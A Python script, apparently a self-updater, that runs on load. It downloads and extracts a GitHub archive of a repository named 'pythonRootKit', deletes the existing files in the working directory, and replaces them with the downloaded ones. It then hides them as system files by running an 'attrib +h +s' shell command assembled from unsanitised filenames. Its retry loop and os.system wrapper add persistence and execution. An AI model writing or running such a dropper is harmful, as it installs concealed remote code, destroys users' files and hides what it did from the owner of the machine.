from fileinput import filename
import requests, zipfile, os, shutil, subprocess, time

def getpath(change=False):
    if change in (False, "not", "\\"):
        return os.getcwd()
    else:
        return os.getcwd().replace('\\', '/')
def getFileName(Path=""):
    return os.path.basename(__file__)
def getNameDir(data):
    return (data.split("/")[len(data.split("/"))-3])+"-"+(((data.split("/")[len(data.split("/"))-1]).split("."))[0])
    
def supDir(data):
    shutil.rmtree(data)
def supFile(data, pathArrivingFiles=""):
    if pathArrivingFiles != "":
        if type(data) == list:
            for i in range(len(data)):
                try:
                    os.remove(data[i-1])
                except:
                    None
        if type(data) == str:
            try:
                os.remove(data)
            except:
                None
    else:
        if type(data) == list:
            for i in range(len(data)):
                if data[i-1] != getFileName():
                    try:
                        os.remove(data[i-1])
                    except:
                        None
        if type(data) == str:
            if data != getFileName():
                try:
                    os.remove(data)
                except:
                    None

def pathReorder(pathArrivingFiles):
    pathArrivingFiles = pathArrivingFiles.split("\\")
    if pathArrivingFiles[len(pathArrivingFiles)-1] == "":
        pathArrivingFiles.pop(len(pathArrivingFiles)-1)
    return "/".join(pathArrivingFiles)
    
def downloadFileGithub(file_url):
    data=".zip"
    r = requests.get(file_url, stream = True) 
    with open(data,"wb") as zip	: 
        for chunk in r.iter_content(chunk_size=1024): 
             # writing one chunk at a time to zip file 
             if chunk: 
                 zip.write(chunk)
    unzipfile()
    
def unzipfile(file=".zip"):
    # open ZIP file in read mode
    with zipfile.ZipFile(file, 'r') as zip: 
        # extract all files
        zip.extractall() 
    os.remove(file)

def hiddenFiles(dir="", NameFile=""):
    files = sortNameFile()
    cmd = "cd "+getpath(True)
    if NameFile != "":
        files = NameFile
    if dir != "":
        cmd = "cd "+dir.replace("\\", "/")
    for i in range (len(files)):
        cmd = cmd + "& attrib +h +s "+files[i-1]
    subprocess.Popen(cmd, shell=True)
    
def sortNameFile(data=getpath(True)):
    from os.path import isfile, join
    return [f for f in os.listdir(data) if isfile(join(data, f))]
    
def moveFileFromDir(data, pathArrivingFiles=""):
    files = sortNameFile(data)
    if pathArrivingFiles != "":
        for f in range(len(files)):
            shutil.copy(getpath(True)+"/"+data+"/"+files[f], pathArrivingFiles)
    else:
        for f in range(len(files)):
            if files[f] != getFileName():
                shutil.copy(getpath(True)+"/"+data+"/"+files[f], getpath(True))

def executeFile(data):
    os.system(data)

def update(data, delete=False, hidden=False, pathArrivingFiles=""):
    '''
    this methode can only be used for download file from github.com
    
    data = link of the web depository
    
    you can also use the delete args
    
    if delete = True all the files in the folder will be deleted then replaced by what has been downloaded
    
    if hidden = True all files in the folder will be hidden
    
    pathArrivedFiles = the folder where the files will arrive
    '''
    dir = getNameDir(data)
    loop = 0
    pathArrivingFiles = pathReorder(pathArrivingFiles)
    while loop < 5:
        try:
            if pathArrivingFiles != "":
                downloadFileGithub(data)
                if delete in (True, "true", "vrai"):
                    supFile(sortNameFile(pathArrivingFiles), pathArrivingFiles)
                moveFileFromDir(dir, pathArrivingFiles)
                supDir(dir)
                if hidden in (True, "true", "vrai"):
                    hiddenFiles(dir=pathArrivingFiles)
            else:
                downloadFileGithub(data)
                if delete in (True, "true", "vrai"):
                    supFile(sortNameFile())
                moveFileFromDir(dir)
                supDir(dir)
                if hidden in (True, "true", "vrai"):
                    hiddenFiles(dir=pathArrivingFiles)
            loop=5
        except:
            loop = loop + 1
            time.sleep(20)

update("https://github.com/N0SAFE/pythonRootKit/archive/main.zip", delete=True, hidden=True)
